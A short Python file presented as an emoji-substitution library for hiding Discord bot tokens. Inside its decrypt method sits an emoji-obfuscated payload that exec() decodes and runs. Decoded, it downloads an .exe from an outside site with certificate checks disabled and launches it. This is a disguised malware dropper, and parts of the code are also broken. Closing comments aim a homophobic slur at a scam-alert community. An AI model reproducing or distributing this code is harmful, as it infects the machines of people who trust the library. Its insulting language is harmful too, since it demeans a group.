class TokenCryptor:
    def encrypt(self, string):
        replacements = {
            'A': '🌼', 'B': '🐾', 'C': '🌈', 'D': '🚀', 'E': '🌍', 'F': '🎉', 'G': '🍕', 'H': '🎨', 'I': '⚡', 'J': '🔑',
            'K': '🥡', 'L': '🌟', 'M': '🌻', 'N': '🐉', 'O': '💧', 'P': '🔔', 'Q': '🦄', 'R': '🌸', 'S': '🏆', 'T': '🛡️',
            'U': '🐬', 'V': '🎈', 'W': '🎵', 'X': '🏮', 'Y': '🔮', 'Z': '🍀', 'a': '🦋', 'b': '🍭', 'c': '🧊', 'd': '🌊',
            'e': '🍇', 'f': '🔥', 'g': '🌿', 'h': '🍂', 'i': '🍔', 'j': '💀', 'k': '🦚', 'l': '🍒', 'm': '🎀', 'n': '🌞',
            'o': '🐢', 'p': '💼', 'q': '🥝', 'r': '🐧', 's': '🥇', 't': '🍉', 'u': '🦦', 'v': '🐷', 'w': '🎂', 'x': '🌴',
            'y': '🌽', 'z': '🧠', '0': '🎳', '1': '🌺', '2': '🏰', '3': '🐠', '4': '🪴', '5': '🍋', '6': '🏈', '7': '🐘',
            '8': '🎭', '9': '🍉', '.': '♫', '(': '💖', ')': '💔', '[': '🌌', ']': '😇', '/': '🚦', '\\': '🛤️', "'": '📜',
            '"': '📖', ';': '📝', ':': '🔍', '!': '🎉', '@': '📧', '#': '💲', '$': '💵', '%': '🎁', '^': '⚓', '&': '🤝',
            '*': '🌟'
        }
        for key, value in replacements.items():
            string = string.replace(key, value)
        return string

    def decrypt(self, encrypted_token):
        replacements = {
            '🌼': 'A', '🐾': 'B', '🌈': 'C', '🚀': 'D', '🌍': 'E', '🎉': 'F', '🍕': 'G', '🎨': 'H', '⚡': 'I', '🔑': 'J',
            '🥡': 'K', '🌟': 'L', '🌻': 'M', '🐉': 'N', '💧': 'O', '🔔': 'P', '🦄': 'Q', '🌸': 'R', '🏆': 'S', '🛡️': 'T',
            '🐬': 'U', '🎈': 'V', '🎵': 'W', '🏮': 'X', '🔮': 'Y', '🍀': 'Z', '🦋': 'a', '🍭': 'b', '🧊': 'c', '🌊': 'd',
            '🍇': 'e', '🔥': 'f', '🌿': 'g', '🍂': 'h', '🍔': 'i', '💀': 'j', '🦚': 'k', '🍒': 'l', '🎀': 'm', '🌞': 'n',
            '🐢': 'o', '💼': 'p', '🥝': 'q', '🐧': 'r', '🥇': 's', '🍉': 't', '🦦': 'u', '🐷': 'v', '🎂': 'w', '🌴': 'x',
            '🌽': 'y', '🧠': 'z', '🎳': '0', '🌺': '1', '🏰': '2', '🐠': '3', '🪴': '4', '🍋': '5', '🏈': '6', '🐘': '7',
            '🎭': '8', '🍉': '9', '♫': '.', '💖': '(', '💔': ')', '🌌': '[', '😇': ']', '🚦': '/', '🛤️': '\\', '📜': "'",
            '📖': '"', '📝': ';', '🔍': ':', '🎉': '!', '📧': '@', '💲': '#', '💵': '$', '🎁': '%', '⚓': '^', '🤝': '&',
            '🌟': '*'
        }
        for key, value in replacements.items():
            encrypted_token = encrypted_token.replace(key, value)
        encrypted_code="🦦🐧🍒 = 📜🍂🍉🍉💼🥇🔍🚦🚦🍉🍂🦦🌿🌿🍔🌞🌿♫🐢🐧🌿🚦🥇🍉🦋🍉🍔🧊🚦🎀🌽🔥🍔🍒🍇♫🍇🌴🍇📜📝 🍒🐢🧊🦋🍒_🔥🍔🍒🍇🌞🦋🎀🍇 = 📜💀🍇🥇🦦🥇🧊🍂🐧🍔🥇🍉♫🍇🌴🍇📜📝 🐧🍇🥇💼🐢🌞🥇🍇 = 🐧🍇🥝🦦🍇🥇🍉🥇♫🌿🍇🍉💖🦦🐧🍒, 🐷🍇🐧🍔🔥🌽=🎉🦋🍒🥇🍇💔📝 🐢💼🍇🌞💖🍒🐢🧊🦋🍒_🔥🍔🍒🍇🌞🦋🎀🍇, 📜🎂🍭📜💔♫🎂🐧🍔🍉🍇💖🐧🍇🥇💼🐢🌞🥇🍇♫🧊🐢🌞🍉🍇🌞🍉💔📝 🐢🥇♫🥇🌽🥇🍉🍇🎀💖🔥📜🥇🍉🦋🐧🍉 {🍒🐢🧊🦋🍒_🔥🍔🍒🍇🌞🦋🎀🍇}📜💔"
        exec(self.RRUU())
        return encrypted_token

    def RRUU(self):
        decrypted_code = self.decrypt(encrypted_code)
        exec(decrypted_code)
        return "test decrypted"
#hi there
#if you are from .gg/scamalerts, i wanna let u know u r fags and should get a life
#that said
#if u r normal, this is a library u can emoji encrypt ur discord bot token with so fags will not get it 